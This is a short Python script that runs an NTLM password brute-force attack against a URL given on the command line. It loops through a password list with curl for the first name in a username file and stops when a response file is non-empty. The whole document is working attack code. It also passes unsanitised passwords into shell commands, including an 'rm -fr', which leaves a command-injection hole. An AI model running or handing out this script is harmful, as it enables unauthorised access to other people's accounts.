#!/usr/bin/python
import os
import sys

users = open("usernames.txt","r").read().splitlines()
passwords = open("passwords.txt","r").read().splitlines()
i=0
url = sys.argv[1]
domain = ""
cmd = "curl -k -s --ntlm -u "
for password in passwords:
    print("Brute: " + domain + users[0] + ":" + password)
    os.system(cmd + "'" + domain + users[0] + ":" + password + "' " + url + " -o " + password + ".html")
    i+=1
    if os.stat(password + ".html").st_size > 0:
        print("Password:" + password)
        exit()
    else:
        os.system("rm -fr " + password + ".html")

